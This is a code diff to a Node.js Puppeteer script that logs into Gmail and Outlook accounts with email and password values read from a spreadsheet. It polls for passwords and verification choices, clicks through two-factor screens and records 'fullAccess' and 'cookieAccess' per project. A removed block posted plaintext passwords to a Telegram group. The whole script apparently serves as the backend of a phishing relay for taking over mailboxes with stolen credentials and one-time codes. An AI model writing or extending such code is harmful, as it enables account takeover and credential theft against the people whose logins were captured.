@@ -189,7 +189,7 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
     logger.info(`[handleAdditionalViews][${instanceId}] Finished processing additional views.`);
 }
 
-async function checkAccountAccess(browser, page, email, password, platform, browserId) {
+async function checkAccountAccess(browser, page, email, password, platform, browserId, isReusingSession = false) {
     const originalPage = page;
     let emailExists = false;
     let accountAccess = false;
@@ -209,27 +209,110 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
             return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, error: "Invalid platform selectors configuration." };
         }
 
-        let gotoSuccessful = false;
-        const gotoRetries = 2;
-        const initialGotoTimeout = 30000;
+        if (!isReusingSession) {
+            let gotoSuccessful = false;
+            const gotoRetries = 2;
+            const initialGotoTimeout = 30000;
 
-        for (let attempt = 1; attempt <= gotoRetries; attempt++) {
+            for (let attempt = 1; attempt <= gotoRetries; attempt++) {
+                try {
+                    logger.debug(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} to navigate to ${platformConfig.url}`);
+                    await originalPage.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: initialGotoTimeout });
+                    gotoSuccessful = true;
+                    logger.info(`[checkAccountAccess][${instanceId}] Navigated to ${platformConfig.url}.`);
+                    break;
+                } catch (e) {
+                    logger.warn(`[checkAccountAccess][${instanceId}] Goto attempt ${attempt}/${gotoRetries} failed: ${e.message}`);
+                    if (attempt === gotoRetries) throw e;
+                    await new Promise(res => setTimeout(res, 2000));
+                }
+            }
+            if (!gotoSuccessful) throw new Error(`Failed to navigate to ${platformConfig.url} after ${gotoRetries} attempts.`);
+        } else {
+            logger.debug(`[checkAccountAccess][${instanceId}] Reusing session, skipping navigation.`);
+        }
+
+        logger.debug(`[checkAccountAccess][${instanceId}] Starting flow for ${platform}.`);
+
+        // Special handling for email retry in reusing session
+        if (isReusingSession && platformConfig.selectors?.input) {
+            logger.info(`[checkAccountAccess][${instanceId}] Reusing session for email retry, typing email directly.`);
             try {
-                logger.info(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} to navigate to ${platformConfig.url}`);
-                await originalPage.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: initialGotoTimeout });
-                gotoSuccessful = true;
-                logger.info(`[checkAccountAccess][${instanceId}] Successfully navigated to ${platformConfig.url} on attempt ${attempt}.`);
-                break;
+                let inputFound = false;
+                try {
+                    await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 5000 });
+                    inputFound = true;
+                } catch (e) {
+                    logger.warn(`[checkAccountAccess][${instanceId}] Input not visible, navigating to login page.`);
+                    await page.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: 30000 });
+                    await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 10000 });
+                    inputFound = true;
+                }
+                if (inputFound) {
+                    await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, platformConfig.selectors.input);
+                    await page.type(platformConfig.selectors.input, email, { delay: 50 });
+
+                    let clicked = false;
+                    if (platformConfig.selectors.nextButton) {
+                        let selectors = Array.isArray(platformConfig.selectors.nextButton) ? platformConfig.selectors.nextButton : [platformConfig.selectors.nextButton];
+                        for (const sel of selectors) {
+                            try {
+                                await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                await page.click(sel);
+                                clicked = true;
+                                break;
+                            } catch (e) {
+                                logger.warn(`[checkAccountAccess][${instanceId}] Next button selector not found or clickable: ${sel}`);
+                            }
+                        }
+                    }
+                    if (!clicked) {
+                        return { emailExists: false, accountAccess: false, requiresVerification: false, error: "Next button not clickable" };
+                    }
+
+                    await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 });
+                    await new Promise(res => setTimeout(res, 2000));
+
+                    // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
+                    await handleAdditionalViews(page, platformConfig, instanceId);
+
+                    // Wait for password input to become visible (handles Outlook "Use your password" transition delay)
+                    if (platformConfig.selectors?.passwordInput && typeof platformConfig.selectors.passwordInput === 'string') {
+                        try {
+                            await page.waitForSelector(platformConfig.selectors.passwordInput, { visible: true, timeout: 5000 });
+                        } catch (e) {
+                            logger.debug(`[checkAccountAccess][${instanceId}] Password input not visible after 5s wait.`);
+                        }
+                    }
+
+                    // Check for password input
+                    if (platformConfig.selectors.passwordInput) {
+                        const pwVisible = await page.$eval(platformConfig.selectors.passwordInput, el => el.offsetParent !== null).catch(() => false);
+                        if (pwVisible) {
+                            return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
+                        }
+                    }
+
+                    // Check for error
+                    if (platformConfig.selectors.errorMessage) {
+                        const errorExists = await page.evaluate((xpath) => {
+                            try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
+                        }, platformConfig.selectors.errorMessage);
+                        if (errorExists) {
+                            return { emailExists: false, accountAccess: false, requiresVerification: false };
+                        }
+                    }
+
+                    return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
+                } else {
+                    return { emailExists: false, accountAccess: false, requiresVerification: false, error: "Login page not accessible" };
+                }
             } catch (e) {
-                logger.warn(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} failed for page.goto(): ${e.message}`);
-                if (attempt === gotoRetries) throw e;
-                await new Promise(res => setTimeout(res, 2000));
+                return { emailExists: false, accountAccess: false, requiresVerification: false, error: e.message };
             }
         }
-        if (!gotoSuccessful) throw new Error(`Failed to navigate to ${platformConfig.url} after ${gotoRetries} attempts.`);
 
-        logger.info(`[checkAccountAccess][${instanceId}] Starting flow for platform ${platform}.`);
-
+        // Normal flow if not reusing email retry
         for (const step of platformConfig.flow || []) {
             try {
                  if (step.action === 'waitForSelector') {
@@ -271,7 +354,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         const element = document.querySelector(selector);
                         if (element) { element.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' }); element.value = ''; }
                     }, resolvedSelector);
-                    await page.type(resolvedSelector, value, { delay: 25 });
+                    await page.type(resolvedSelector, value, { delay: 20 });
                     if (step.delay && typeof step.delay === 'number' && step.delay > 0) {
                         logger.info(`[checkAccountAccess][${instanceId}] Performing explicit step delay: ${step.delay}ms`);
                         await new Promise(res => setTimeout(res, step.delay));
@@ -460,9 +543,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
 async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
   const browserId = row[columnIndexes['browserId']];
+  const status = row[columnIndexes['status']];
   let email = row[columnIndexes['email']]; // Changed to let
   const password = row[columnIndexes['password']];
-  logger.info(`[processRow][${browserId}] Processing row.`);
+  logger.debug(`[processRow][${browserId}] Processing row.`);
 
   const userDataDir = `users_data/${browserId}`;
   let browser = null;
@@ -586,7 +670,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
       let mxRecords = [];
       let matchedPlatformKey = '';
       let platformConfig = {};
-      
+
       // Determine platform and platformConfig early if email is available
       if (email) { // Only if email is available from the start or found in WAITINGEMAIL
           domain = email.split('@')[1].toLowerCase();
@@ -603,7 +687,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
       // WAITINGEMAIL state with an informative lastJsonResponse so the UI can surface a
       // distinct error (unable to determine login URL) that is different from a later
       // 'incorrect email after page load' detection.
-      if (email && (!platformConfig || !platformConfig.url || platform === 'unknown')) {
+      if (status !== 'WAITINGEMAIL' && email && (!platformConfig || !platformConfig.url || platform === 'unknown')) {
           logger.info(`[processRow][${browserId}] Could not determine platform/login URL for domain '${domain}'. Persisting WAITINGEMAIL with descriptive lastJsonResponse.`);
           finalStatus = "WAITINGEMAIL";
           updateData.status = finalStatus;
@@ -622,14 +706,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
           return; // Exit so no later logic overwrites this WAITING state
       }
       
-      const currentSheetStatusFromRow = row[columnIndexes['status']];
-      
       // Main state handling logic
-      if (currentSheetStatusFromRow === "WAITING") {
-          logger.info(`[processRow][${browserId}] Initial WAITING state. Performing initial checkAccountAccess.`);
+      if (status === "WAITING") {
+          logger.debug(`[processRow][${browserId}] Initial WAITING state. Performing initial checkAccountAccess.`);
           await handleAdditionalViews(page, platformConfig, instanceId, 'initial_load');
           initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId);
-      } else if (currentSheetStatusFromRow === "WAITINGEMAIL") {
+      } else if (status === "WAITINGEMAIL") {
           logger.info(`[processRow][${browserId}] Entering WAITINGEMAIL poll loop.`);
           const pollingTimeoutEmail = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
           let emailProvidedAndProcessed = false;
@@ -680,7 +762,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                       platform = matchedPlatformKey || 'unknown';
                       platformConfig = platformConfigs[platform] || {};
                       
-                      initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId); // This is the only place checkAccountAccess is called for WAITINGEMAIL
+                      initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true); // For email retry, reuse session, no navigation
 
                       // Immediately check the result for generic email errors and set status within the polling loop
                       if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
@@ -719,7 +801,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
               }
 
               if (!emailProvidedAndProcessed) {
-                  await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
+                  await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
               }
           }
 
@@ -734,14 +816,15 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
         message: "Failed during WAITINGEMAIL phase: Email not provided in time."
       });
+
               // Explicitly close browser and clean up immediately
               if (browser && !browserFullyClosed) {
                   if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                  await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGEMAIL timeout: ${err.message}`));
-                  browserFullyClosed = true;
-                  activeBrowserSessions.delete(browserId);
-                  await new Promise(resolve => setTimeout(resolve, 1000));
-              }
+              await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGEMAIL timeout: ${err.message}`));
+              browserFullyClosed = true;
+              activeBrowserSessions.delete(browserId);
+              await new Promise(resolve => setTimeout(resolve, 1000));
+          }
               if (userDataDir) {
                   try {
                       logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
@@ -754,7 +837,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
               logger.debug(`[processRow][${browserId}] Exiting WAITINGEMAIL timeout path.`);
               return; // Exit processRow if email not found
           }
-      } else if (currentSheetStatusFromRow === "WAITINGPASSWORD") {
+      } else if (status === "WAITINGPASSWORD") {
           logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
           const pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
           let passwordProvidedAndProcessed = false;
@@ -785,9 +868,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                       break;
                   }
 
-                  logger.debug(`[processRow][${browserId}][WAITINGPASSWORD] Full checkRow: ${JSON.stringify(checkRow)}`);
-                  const currentPassword = checkRow[checkColumnIndexes['password']];
-                  logger.debug(`[processRow][${browserId}][WAITINGPASSWORD] Fetched password: '*****', Type: ${typeof currentPassword}`); // Reverted to masked password
+                  const currentPassword = checkRow[columnIndexes['password']];
 
                   if (currentPassword && String(currentPassword).trim() !== "") {
                       logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found. Setting status to PROCESSING.`);
@@ -807,7 +888,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               await page.waitForSelector(passwordInputSelector, { visible: true, timeout: 10000 });
                               logger.debug(`[processRow][${browserId}] Clearing password input field: ${passwordInputSelector}`);
                               await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, passwordInputSelector);
-                              logger.debug(`[processRow][${browserId}] Attempting to type password into ${passwordInputSelector}`);
                               await page.type(passwordInputSelector, currentPassword, { delay: 50 });
                               logger.info(`[processRow][${browserId}] Successfully typed password.`);
 
@@ -876,7 +956,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               if (platformConfig.selectors.loginFailed) {
                                   const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ?
                                       platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
-                                  
+
                                   for (const selector of loginFailedSelectors) {
                                       if (typeof selector === 'string') {
                                           const failExists = await page.evaluate((xpath) => {
@@ -927,15 +1007,17 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               } else {
                                   // After password submission, check if we reached inbox or a verification screen
                                   const verificationDetails = await checkVerification(page, platformConfig);
+                                  logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Verification details after password: ${JSON.stringify(verificationDetails)}`);
                                   if (verificationDetails.required) {
                                       initialCheckResult = {
                                           emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true,
-                                          verificationState: verificationDetails.type === 'choice' ? 'WAITING_OPTIONS' : 'WAITING_CODE',
+                            verificationState: verificationDetails.type === 'choice' ? 'WAITINGOPTIONS' : 'WAITINGCODE',
                                           verificationOptions: verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName) : [],
                                           viewName: verificationDetails.viewName
                                       };
                                   } else {
                                       const inboxReached = await isInbox(page, platformConfig);
+                                      logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox reached: ${inboxReached}`);
                                       initialCheckResult = {
                                           emailExists: true, accountAccess: true, reachedInbox: inboxReached, requiresVerification: false, verificationState: null
                                       };
@@ -945,33 +1027,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               // If a password attempt resulted in a password-specific failure or accountAccess=false,
                               // transition back to WAITINGPASSWORD so the user can provide a new password.
                               if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR' || (initialCheckResult.emailExists && !initialCheckResult.accountAccess && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined))) {
-                                  // **Telegram Notification for Incorrect Password**
-                                  logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Sending Telegram notification.`);
-                                  const allDataForTelegram = await fetchDataFromAppScript();
-                                  const headersForTelegram = allDataForTelegram[0];
-                                  const columnIndexesForTelegram = getColumnIndexes(headersForTelegram);
-                                  const rowDataForTelegram = allDataForTelegram.slice(1).find(r => r[columnIndexesForTelegram['browserId']] === browserId);
-
-                                  if (rowDataForTelegram) {
-                                      const projectId = rowDataForTelegram[columnIndexesForTelegram['projectId']];
-                                      const storedPassword = rowDataForTelegram[columnIndexesForTelegram['password']];
-                                      if (projectId) {
-                                          const projectDetails = await getProjectDetails(projectId);
-                                          const projectTitle = projectDetails?.projectTitle || 'Unknown Project';
-                                          const telegramGroupId = projectDetails?.telegramGroupId;
-
-                                          if (telegramGroupId) {
-                                              let message = `🚨 *Login Failed: Incorrect Password* 🚨\n\n`;
-                                              message += `*Project:* ${projectTitle}\n`;
-                                              message += `*Email:* \`${email}\`\n`;
-                                              message += `*Password:* \`${storedPassword}\`\n`;
-                                              message += `*Browser ID:* \`${browserId}\`\n`;
-
-                                              await sendTelegramMessage(telegramGroupId, message);
-                                          }
-                                      }
-                                  }
-
                                   logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Setting status to WAITINGPASSWORD.`);
                                   finalStatus = "WAITINGPASSWORD";
                                   // Ensure updateData reflects the new status immediately so finally() sees it
@@ -989,7 +1044,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                   });
                                   // Clear the password field and persist the WAITINGPASSWORD state
                                   logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
-                                  await updateBrowserRowData(browserId, { ...updateData, password: '' });
+                                  await updateBrowserRowData(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                   return; // Exit processRow so no later logic overwrites status
                               }
 
@@ -1011,9 +1066,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                           finalStatus = "FAILED";
                           break;
                       }
-                  } else {
-                      logger.debug(`[processRow][${browserId}][WAITINGPASSWORD] No password found yet. Waiting...`);
-                  }
+                    }
 
               } catch (pollError) {
                   logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Error during polling: ${pollError.message}`);
@@ -1021,28 +1074,30 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
               }
 
               if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
-                  await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
+                  await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
               }
           }
 
           if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
-              logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Polling for password timed out. Setting status to FAILED.`);
-              finalStatus = "FAILED";
-              updateData.status = "FAILED";
-              updateData.verified = false; // FAILED so verified false
-              updateData.fullAccess = false; // FAILED so fullAccess false
-              updateData.lastJsonResponse = JSON.stringify({
-                  ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                  message: "Failed during WAITINGPASSWORD phase: Password not provided in time."
-              });
+      logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Polling for password timed out. Setting status to FAILED.`);
+      finalStatus = "FAILED";
+      updateData.status = "FAILED";
+      updateData.verified = false; // FAILED so verified false
+      updateData.fullAccess = false; // FAILED so fullAccess false
+      updateData.cookieAccess = false; // FAILED so cookieAccess false
+      updateData.lastJsonResponse = JSON.stringify({
+          ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+          message: "Failed during WAITINGPASSWORD phase: Password not provided in time."
+      });
+
               // Explicitly close browser and clean up immediately
               if (browser && !browserFullyClosed) {
                   if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                  await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGPASSWORD timeout: ${err.message}`));
-                  browserFullyClosed = true;
-                  activeBrowserSessions.delete(browserId);
-                  await new Promise(resolve => setTimeout(resolve, 1000));
-              }
+              await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGPASSWORD timeout: ${err.message}`));
+              browserFullyClosed = true;
+              activeBrowserSessions.delete(browserId);
+              await new Promise(resolve => setTimeout(resolve, 1000));
+          }
               if (userDataDir) {
                   try {
                       logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
@@ -1063,8 +1118,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                   message: "Failed during WAITINGPASSWORD phase."
               });
           }
-      } else if (currentSheetStatusFromRow === "WAITINGOPTIONS") {
+      } else if (status === "WAITINGOPTIONS") {
           logger.info(`[processRow][${browserId}] Resuming from WAITINGOPTIONS state.`);
+          finalStatus = "WAITINGOPTIONS";
+          let currentVerificationOptions = [];
           const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000; 
 
           while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
@@ -1079,18 +1136,22 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                   }
                   
                   const currentActualViewName = currentPageVerificationState.viewName;
-                  logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Current actual view for options: ${currentActualViewName}`);
+                  logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Current actual view: ${currentActualViewName}`);
                   let freshCurrentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName);
                   
                   const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                   if (ljp.viewName !== currentActualViewName || JSON.stringify(ljp.verificationOptions) !== JSON.stringify(freshCurrentVerificationOptions)) {
                       logger.info(`[processRow][${browserId}][WAITINGOPTIONS] View or options changed/refreshed. Updating LJR and sheet. LJR View: ${ljp.viewName}, Actual View: ${currentActualViewName}`);
-                      updateData.lastJsonResponse = JSON.stringify({
+                      const ljr = {
                           ...ljp,
                           viewName: currentActualViewName,
-                          verificationOptions: freshCurrentVerificationOptions, 
-                          status: "WAITINGOPTIONS" 
-                      });
+                          verificationOptions: freshCurrentVerificationOptions,
+                          status: "WAITINGOPTIONS"
+                      };
+                      if (platform === 'gmail' && currentActualViewName === 'Gmail Verification Choices') {
+                        ljr.gmail = { step: "waiting_options", options: freshCurrentVerificationOptions };
+                      }
+                      updateData.lastJsonResponse = JSON.stringify(ljr);
                       await updateBrowserRowData(browserId, {
                         status: "WAITINGOPTIONS",
                         verified: true,
@@ -1199,8 +1260,30 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               await page.waitForSelector(`#${selectedOption.id}`, { visible: true, timeout: 5000 });
                               await page.click(`#${selectedOption.id}`);
                               logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked radio button: #${selectedOption.id}`);
-                              await new Promise(res => setTimeout(res, 500)); 
-                          } else if (selectedOption.type === 'full_email_input') {
+                              await new Promise(res => setTimeout(res, 500));
+                            } else if (!selectedOption.id && selectedOption.type !== 'full_email_input') {
+                                const vv3Count = await page.evaluate(() => document.querySelectorAll('.VV3oRb').length).catch(() => -1);
+                                logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Attempting text-click. Target label: "${selectedOption.label}", .VV3oRb count: ${vv3Count}`);
+                                const clickedByText = await page.evaluate((label) => {
+                                    const links = document.querySelectorAll('.VV3oRb');
+                                    for (const link of links) {
+                                        if (link.textContent && link.textContent.trim().includes(label)) {
+                                            link.click();
+                                            return true;
+                                        }
+                                    }
+                                    return false;
+                                }, selectedOption.label);
+                                if (clickedByText) {
+                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked option by text: ${selectedOption.label}`);
+                                    await new Promise(res => setTimeout(res, 500));
+                                    const postClickState = await checkVerification(page, platformConfig);
+                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Post-text-click verification: ${JSON.stringify(postClickState)}`);
+                                } else {
+                                    const availableLabels = await page.evaluate(() => Array.from(document.querySelectorAll('.VV3oRb')).map(el => el.textContent.trim())).catch(() => ['evaluate-failed']);
+                                    logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Text-click failed. Target: "${selectedOption.label}". Available: ${JSON.stringify(availableLabels)}`);
+                                }
+                           } else if (selectedOption.type === 'full_email_input') {
                               logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Full email input type, no radio button to click for selection, input will be typed.`);
                           }
 
@@ -1218,94 +1301,154 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Option requires input, but no hiddenPhoneEmail provided. Attempting to proceed without it for option: ${selectedOption.label}`);
                           }
                           
-                          let sendCodeBtnSelector;
-                          if (currentActualViewName === 'Outlook Verify Email Full Input') {
-                              sendCodeBtnSelector = platformConfig.selectors.verifyEmailSendCodeButton;
-                          } else { 
-                              sendCodeBtnSelector = platformConfig.selectors.sendCodeButton;
-                          }
+                           if (platform === 'gmail') {
+                               // Gmail: selecting an option navigates directly (no "Send code" button)
+                               logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail option clicked. Waiting for page transition.`);
+                               await new Promise(res => setTimeout(res, 3000));
+                               const gmailPostClickVerification = await checkVerification(page, platformConfig);
+                               if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'code') {
+                                   logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to code entry: ${gmailPostClickVerification.viewName}. Setting WAITINGCODE.`);
+                                   finalStatus = "WAITINGCODE";
+                                   const ljpGmail = JSON.parse(updateData.lastJsonResponse || '{}');
+                                   updateData = {
+                                       status: "WAITINGCODE",
+                                       verificationChoice: '',
+                                       lastJsonResponse: JSON.stringify({
+                                           ...ljpGmail,
+                                           status: "WAITING_CODE",
+                                           verificationState: 'WAITING_CODE',
+                                           viewName: gmailPostClickVerification.viewName,
+                                           verificationOptions: currentVerificationOptions,
+                                           message: "Verification code screen reached."
+                                       })
+                                   };
+                                   await updateBrowserRowData(browserId, updateData);
+                                   break;
+                               } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'choice') {
+                                   logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail still on choice page after click (e.g. account_recovery). Refreshing options.`);
+                                   currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, gmailPostClickVerification.viewName);
+                                   await updateBrowserRowData(browserId, {
+                                       status: "WAITINGOPTIONS",
+                                       verificationChoice: '',
+                                       verificationOptions: JSON.stringify(currentVerificationOptions),
+                                       lastJsonResponse: JSON.stringify({
+                                           ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                           status: "WAITING_OPTIONS",
+                                           viewName: gmailPostClickVerification.viewName,
+                                           verificationOptions: currentVerificationOptions,
+                                           message: "Selections refreshed."
+                                       })
+                                   });
+                               } else {
+                                   const gmailInbox = await isInbox(page, platformConfig).catch(() => false);
+                                   if (gmailInbox) {
+                                       logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail reached inbox after option click.`);
+                                       finalStatus = "COMPLETED";
+                                       break;
+                                   }
+                                   logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Gmail option click: unexpected page state. Continuing poll.`);
+                                   await updateBrowserRowData(browserId, {
+                                       status: "WAITINGOPTIONS",
+                                       verificationChoice: '',
+                                       lastJsonResponse: JSON.stringify({
+                                           ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                           status: "WAITING_OPTIONS",
+                                           message: "Unexpected state after option click."
+                                       })
+                                   });
+                               }
+                               await new Promise(resolve => setTimeout(resolve, 2000));
+                               continue;
+                           }
 
-                          if (!sendCodeBtnSelector) throw new Error(`Send code button selector not defined for current view/platform configuration. View: ${currentActualViewName}`);
-                          
-                          logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Attempting to click send code button: ${sendCodeBtnSelector} for view ${currentActualViewName}`);
-                          await page.waitForSelector(sendCodeBtnSelector, { visible: true, timeout: 10000 }); 
-                                  const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
-                                  await page.click(sendCodeBtnSelector);
-                                  await navigationPromise;
-                                  logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked "Send code" button: ${sendCodeBtnSelector}`);
-                                  await new Promise(res => setTimeout(res, 2000));
+                           let sendCodeBtnSelector;
+                           if (currentActualViewName === 'Outlook Verify Email Full Input') {
+                               sendCodeBtnSelector = platformConfig.selectors.verifyEmailSendCodeButton;
+                           } else { 
+                               sendCodeBtnSelector = platformConfig.selectors.sendCodeButton;
+                           }
 
-                                  const outlookServiceErrorText = "There's a temporary problem with the service.";
-                                  const hasOutlookServiceError = await page.evaluate((errorText) => {
-                                      return document.body.innerText.includes(errorText);
-                                  }, outlookServiceErrorText).catch(() => false);
+                           if (!sendCodeBtnSelector) throw new Error(`Send code button selector not defined for current view/platform configuration. View: ${currentActualViewName}`);
+                           
+                           logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Attempting to click send code button: ${sendCodeBtnSelector} for view ${currentActualViewName}`);
+                           await page.waitForSelector(sendCodeBtnSelector, { visible: true, timeout: 10000 }); 
+                                   const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
+                                   await page.click(sendCodeBtnSelector);
+                                   await navigationPromise;
+                                   logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked "Send code" button: ${sendCodeBtnSelector}`);
+                                   await new Promise(res => setTimeout(res, 2000));
 
-                                  if (hasOutlookServiceError) {
-                                      logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Outlook service error detected: "${outlookServiceErrorText}"`);
-                                      const errorOption = [{ label: "Outlook: Temporary service problem. Please wait and try again.", type: "service_error", choiceIndex: "outlook_service_error" }];
-                                      currentVerificationOptions = errorOption; // Update for LJR
+                                   const outlookServiceErrorText = "There's a temporary problem with the service.";
+                                   const hasOutlookServiceError = await page.evaluate((errorText) => {
+                                       return document.body.innerText.includes(errorText);
+                                   }, outlookServiceErrorText).catch(() => false);
 
-                                      const ljpServiceError = JSON.parse(updateData.lastJsonResponse || '{}');
-                                      updateData.lastJsonResponse = JSON.stringify({
-                                          ...ljpServiceError,
-                                          status: "WAITINGOPTIONS",
-                                          verificationState: 'WAITING_OPTIONS',
-                                          verificationOptions: errorOption,
-                                          viewName: currentActualViewName, 
-                                          message: "Outlook reported a temporary service problem. Please try again later."
-                                      });
-                                      await updateBrowserRowData(browserId, {
-                                          status: "WAITINGOPTIONS",
-                                          verificationChoice: '', // Re-added clearing
-                                          verificationOptions: JSON.stringify(errorOption),
-                                          lastJsonResponse: updateData.lastJsonResponse
-                                      });
-                                      // Continue to the next iteration of the WAITINGOPTIONS polling loop
-                                      await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
-                                      continue; 
-                                  }
-                                  
-                                  const verificationStatusAfterSend = await checkVerification(page, platformConfig);
-                                  if (verificationStatusAfterSend.required && verificationStatusAfterSend.type === 'code') {
-                                      logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Successfully sent code. Transitioning to WAITINGCODE. View detected: ${verificationStatusAfterSend.viewName}`);
-                                      finalStatus = "WAITINGCODE";
-                                      const ljpBeforeCodeSend = JSON.parse(updateData.lastJsonResponse || '{}');
